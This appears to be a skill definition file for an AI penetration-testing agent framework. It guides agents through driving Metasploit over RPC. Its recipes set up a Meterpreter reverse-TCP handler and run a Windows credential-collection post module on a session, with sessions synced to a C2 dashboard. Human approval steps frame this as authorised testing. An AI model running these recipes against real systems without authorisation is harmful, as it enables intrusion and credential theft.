---
name: metasploit-integration
description: msfrpcd integration + module selection guide
license: apache-2.0
compatibility: ">=3.2"
metadata:
  version: "1.0.0"
  tags: ["metasploit", "msf", "msfrpcd"]
  triggers: ["metasploit", "msf", "msfrpcd"]
allowed-tools: "metasploit"
mapped-agents: ["penetration", "privilege-escalation", "lateral-movement"]
---

# metasploit-integration

## Overview

Metasploit RPC integration guide — module selection (exploits/auxiliary/post), session management, post-exploitation modules. Uses app/exploit/metasploit_client.py (msgpack RPC client → msfrpcd at 127.0.0.1:55553).

## When to Use

When Metasploit exploitation is required (HITL approved). Loaded by penetration, privilege-escalation, lateral-movement agents.

**Mapped agents**: penetration, privilege-escalation, lateral-movement

## Methodology

- 1. Start msfrpcd as direct process: msfrpcd -P <password> -U msfuser -p 55553 -a 127.0.0.1 -S
- 2. Connect via app/exploit/metasploit_client.py (msgpack RPC)
- 3. Module discovery (list exploit/auxiliary/post modules, cache results)
- 4. Select module based on target (e.g. exploit/multi/handler for reverse shell)
- 5. Configure module options (RHOSTS, LHOST, LPORT, PAYLOAD)
- 6. Execute exploit (HITL approval required — D25)
- 7. Session management (sync to C2Session table — D28 unified C2)
- 8. Post-exploitation: run post modules on sessions

## Tool Recipes

```bash
app/exploit/metasploit_client.py: MetasploitClient(host='127.0.0.1', port=55553, user='msfuser', password=...)
```
```bash
client.execute_exploit('exploit/multi/handler', {'LHOST': '0.0.0.0', 'LPORT': 4444, 'PAYLOAD': 'windows/x64/meterpreter/reverse_tcp'})
```
```bash
client.run_post_module('post/windows/gather/credentials/credential_collector', session_id=1)
```

## Output Standards

Each MSF execution: module name, options used (redacted password), session ID created (sync to C2Session), MITRE ATT&CK technique, HITL approval ID. Sync all sessions to C2Session table for unified C2 dashboard.

## VAPT-AI Specific Notes

- This skill follows the agentskills.io specification (same as CyberStrikeAI).
- Loaded by SkillLoader (app/skills/loader.py) on first access.
- Auto-loaded by mapped agents via BaseAgent.__init__() (W11-S5).
- Skill content available via `GET /api/orchestration/skills/metasploit-integration` (W11-S6).
- D18 guardrails apply: skills do NOT bypass tool allowlist enforcement.
- HITL approval still required for destructive operations (skill content is advisory).
